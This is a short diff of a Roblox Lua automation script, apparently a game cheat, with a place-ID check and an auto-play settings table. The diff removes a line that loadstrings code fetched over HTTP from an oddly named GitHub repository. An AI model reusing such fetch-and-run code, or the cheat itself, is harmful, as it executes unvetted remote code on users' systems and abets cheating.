@@ -1,5 +1,4 @@
 repeat wait() until game.Players.LocalPlayer
--- [Place Id Check]
 local id = game.PlaceId
 if id == 2753915549 then
 World1 = true; 
@@ -86,10 +85,6 @@ _G.Settings = {
     AutoRaids = false,
     AutoNextPlace = false
 }
-
-pcall(function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/SSDAWGDFHTEHVFFSGXCVBSDFBFDGWGSDVDDSXC/d/main/notificationVec"))()
-end) 
 
 local Ui = game:GetService("CoreGui"):FindFirstChild("Perpid")
 if Ui then
